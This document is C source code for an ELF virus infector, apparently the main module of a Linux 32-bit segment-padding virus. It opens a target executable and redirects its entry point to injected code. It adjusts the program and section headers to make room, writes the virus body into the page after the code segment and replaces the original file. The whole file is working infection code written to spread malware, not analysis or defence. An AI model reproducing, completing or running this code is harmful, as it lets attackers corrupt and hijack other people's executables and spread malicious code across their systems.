#include "includes.h"
#include "defines.h"
#include "virus.h"

bool open_file(Infect*);
bool map_file(Infect*);
bool is_it_ELF(Infect*);
bool find_segments(Infect*);

bool start_infection(Infect*);
bool patch_entry_addr(Infect*);
bool patch_PHDR(Infect*);
bool patch_SHDR(Infect*);

bool create_tempf(Infect*);
bool write_till_virus(Infect*);
bool close_target(Infect*);
extern bool write_virus(Infect*);

/* ---------------------- main ------------------------ */
int main(int argc,char **argv)
{
	Infect virus_target;
	
	if(argc!=2) {
		fprintf(stderr,"usage : %s file_to_infect\n",argv[0]);
		return 0;
	}
	
	/* copying target name to our global structure */
	strcpy(virus_target.src_f,argv[1]);
	
	/* opening our target ... */
	if(!open_file(&virus_target)) return true;    /* remember true is 1 ;) */
	
	/* maping file... */
	if(!map_file(&virus_target)) return true;
	
	/* checking if ELF file... */
	if(!is_it_ELF(&virus_target)) return true;
	
	/* find necessary LOAD segments */
	if(!find_segments(&virus_target)) return true;
	
	/* start with infection of target...*/
	if(!start_infection(&virus_target)) return true;
	
	/* close file...*/
	close(virus_target.fd_f);
	
}

/* -------------------- is_it_ELF -------------------- */
bool is_it_ELF(Infect *file)
{
	/* we'll check if our target is an ELF file and can be executed */
	/* therefore we'll compare the data at the beginning of the file
	 * with the data of the currently runned file( CURRENT ) which is an ELF file
	 * coz its being executed ;)
	 * */
	
	/* we'll compare untill the address where e_entry ( entry point ) 
	  beginns */
	int comp_size=offsetof(Elf32_Ehdr,e_entry);
	
        Elf32_Ehdr *Ehdr=file->mmap.ehdr;
	
	if(memcmp(&Ehdr->e_ident,CURRENT->e_ident,comp_size)) ERROR(is_it_ELF);
	
	if(Ehdr->e_phoff != CURRENT->e_phoff) ERROR(is_it_ELF);
	if(Ehdr->e_ehsize != CURRENT->e_ehsize) ERROR(is_it_ELF);
	if(Ehdr->e_phentsize != CURRENT->e_phentsize) ERROR(is_it_ELF);
	if(Ehdr->e_shentsize != CURRENT->e_shentsize) ERROR(is_it_ELF);
	
	return true;
}


/* -------------------- find_segments ----------------- */
bool find_segments(Infect *file)
{
	/* here we'll initialize the phdr structure in our global structure: virus_target
	 * we must find the offsets where those structures beginn */
	
	Elf32_Phdr *Phdr,*Phdr_DATA,*Phdr_CODE;
	unsigned int load_segments_found=0;
	unsigned int i;
	
	/* move to first PHDR entry : e_phoff */
	Phdr=file->phdr=(Elf32_Phdr*)(file->mmap.byte+file->mmap.ehdr->e_phoff);
	
	file->phdr_dyn=0;
	
	/* now we must find our code segment ... */
	for(i=file->mmap.ehdr->e_phnum;i>0;i--,Phdr++)
	{
		switch(Phdr->p_type)
		{
		    case PT_LOAD:load_segments_found++;Phdr_DATA=Phdr;break;
		    case PT_DYNAMIC:file->phdr_dyn=Phdr;break;
		}
	}
	
	if(load_segments_found!=2) return false;
	
	if(!(long)Phdr_DATA) return false;
	
	file->phdr_code=Phdr_CODE=Phdr_DATA-1;
	
	/* check if code & data segment are loadable... */
	if(Phdr_CODE->p_type!=PT_LOAD || Phdr_DATA->p_type!=PT_LOAD) return false;
	
	
	/* first byte after the code segment... */
	file->end_of_codes=Phdr_CODE->p_filesz + Phdr_CODE->p_offset;
	file->aligned_end_of_codes=ALIGN_UP(file->end_of_codes);
	
#ifdef DEBUG_IT
	printf("....:::: [ find_segments ] ::::....\n");
	printf("end_of_codes         = 0x%x\n",file->end_of_codes);
	printf("aligned_end_of_codes = 0x%x\n",file->aligned_end_of_codes);
	printf("\n");
#endif 	
	
	return true;
}
	
	

/* ---------------------- open_file ------------------- */
bool open_file(Infect *file)
{
	/* try to open our target... */
	if((file->fd_f=open(file->src_f,O_RDONLY))<0) ERROR(open_file);
	
	/* find out file size...a good method is to seek at the end of the file */
	if((file->file_size=lseek(file->fd_f,0,SEEK_END))<0) ERROR(open_file);
	
	/* align up the file size...needed later for inserting our virus 
	 * at the right offset */
	file->aligned_fsz=ALIGN_UP(file->file_size);

#ifdef DEBUG_IT
	printf("....:::: [ open_file ] ::::....\n");
	printf("src_f       = %s\n",file->src_f);
	printf("file_size   = %d\n",file->file_size);
	printf("aligned_fsz = %d\n",file->aligned_fsz);
	printf("\n");
#endif	
	
	
	return true;	
}

/* ------------------- map_file -------------------- */
bool map_file(Infect *file)
{
        /* now we're gonna map the whole file... thats quite usefull if 
	 * we want to modify the file indirect ... at the end of the modifications
	 * the file will be updated  with all that new modifications
	 * see : man mmap  for more info */
	
	if((file->mmap.start=mmap(0,file->file_size,PROT_READ | PROT_WRITE,MAP_PRIVATE,file->fd_f,0))==MAP_FAILED) ERROR(map_file);
	
	return true;
}


/* ------------------ start_infection ----------------- */
bool start_infection(Infect *file)
{
	/* we will start here with our patching procedures etc. */
	
	/* first of all we must patch the entry point address : Ehdr->e_entry */
	if(!patch_entry_addr(file)) return false;
	
	/* patching Program Header(PHDR) */
	if(!patch_PHDR(file)) return false;
	
	/* patching Sections Header(SHDR) */
	if(!patch_SHDR(file)) return false;
	
	/* create temp file...*/
	if(!create_tempf(file)) return false;
	
	/* beginn writting process... */
	if(!write_till_virus(file)) return false;
	
	/* rename temp file to original file name*/
	rename(TEMP_FILE,file->src_f);
	
	/* unmap target ... */
	if(!close_target(file)) return false;
	
	return true;
}


/* ----------------- close_target ------------------- */
bool close_target(Infect *file)
{
	munmap(file->mmap.start,file->file_size);
	
	/* closing both file descriptors... */
	close(file->fd_f);
	close(file->fd_dest);
	
	return true;
}

/* ---------------- write_till_virus ---------------- */
bool write_till_virus(Infect *file)
{
	/* writting until the end of the code segment where
	 * we'll gonna insert our virus... */
	
	write(file->fd_dest,file->mmap.start,file->end_of_codes);
	
	/* seeking to the aligned address where we must insert our virus
	 code */
	if(lseek(file->fd_dest,file->aligned_end_of_codes,SEEK_SET)<0) ERROR(write_till_virus);
	
	/* write our virus code ... */
	if(!write_virus(file)) return false;
	
	/* seek after the virus code to insert the rest of file... */
	if(lseek(file->fd_dest,file->end_of_codes+ELF_PAGE_SZ,SEEK_SET)<0) ERROR(write_till_virus);
	
	/* copying rest of file...*/
	write(file->fd_dest,file->mmap.start+file->end_of_codes,file->file_size-file->end_of_codes);
	
	
	return true;
}


/* --------------------- create_tempf ------------------ */
bool create_tempf(Infect *file)
{
	if((file->fd_dest=open(TEMP_FILE,O_WRONLY | O_CREAT | O_TRUNC,0775))<0) ERROR(create_tempf);
	
#ifdef DEBUG_IT
	printf("....:::: [ create_tempf ] ::::....\n");
	printf("TEMP_FILE = %s\n",TEMP_FILE);
	printf("\n");
	
#endif	
	return true;
}

/* ------------------ patch_SHDR ------------------- */
bool patch_SHDR(Infect *file)
{
	Elf32_Shdr *Shdr;
	off_t end_of_code_segment=file->end_of_codes;
	unsigned int i;
	
	/* move to first entry in the SHDR */
	Shdr=(Elf32_Shdr*)(file->mmap.start+file->mmap.ehdr->e_shoff);
	
	/* patching e_shoff ... */
	file->mmap.ehdr->e_shoff += ELF_PAGE_SZ;
	
	/* patching sh_offset etc. */
	for(i=file->mmap.ehdr->e_shnum;i>0;i--,Shdr++)
	{
		if(Shdr->sh_offset>=end_of_code_segment)
			Shdr->sh_offset += ELF_PAGE_SZ;
		
		else if(Shdr->sh_offset + Shdr->sh_size == end_of_code_segment)
			Shdr->sh_size += ELF_PAGE_SZ;
	}
	
#ifdef DEBUG_IT
	printf("....:::: [ patch_SHDR ] ::::....\n");
	printf("(new) e_shoff = 0x%x\n",file->mmap.ehdr->e_shoff);
	printf("\n");
	
#endif	
	
	return true;
}
	
       

/* ------------------- patch_PHDR ------------------ */
bool patch_PHDR(Infect *file)
{
	Elf32_Phdr *Phdr,*Phdr_CODE;
	off_t end_of_code_segment; 
	unsigned int i;
	
	Phdr_CODE=file->phdr_code;
	Phdr=file->phdr;
	
	/* patching p_filesz and p_memsz... */
	Phdr_CODE[0].p_filesz += ELF_PAGE_SZ;
	Phdr_CODE[0].p_memsz += ELF_PAGE_SZ;
	
	end_of_code_segment=file->end_of_codes;
	
	for(i=file->mmap.ehdr->e_phnum;i>0;i--,Phdr++)
	{
		/* patching p_offset */
		if(Phdr->p_offset>=end_of_code_segment)
			Phdr->p_offset += ELF_PAGE_SZ;
	}
	
#ifdef DEBUG_IT
	printf("....:::: [ patch_PHDR ] ::::....\n");
	printf("(new) p_filesz = 0x%x\n",Phdr_CODE[0].p_filesz);
	printf("(new) p_memsz  = 0x%x\n",Phdr_CODE[0].p_memsz);
	printf("\n");
#endif	
	
	return true;
	
}
	

/* ------------------ patch_entry_addr ----------------- */
bool patch_entry_addr(Infect *file)
{
	/* save the original entry point ...needed later */
	file->origin_entry=file->mmap.ehdr->e_entry;
	
	/* patch entry point address */
	file->mmap.ehdr->e_entry=ALIGN_UP(file->phdr_code->p_filesz + file->phdr_code->p_vaddr);
	
#ifdef DEBUG_IT
	printf("....:::: [ patch_entry_addr ] ::::....\n");
	printf("original entry point = 0x%x\n",file->origin_entry);
	printf("(new) entry point    = 0x%x\n",file->mmap.ehdr->e_entry);
	printf("\n");
	
#endif    
	
	return true;
}
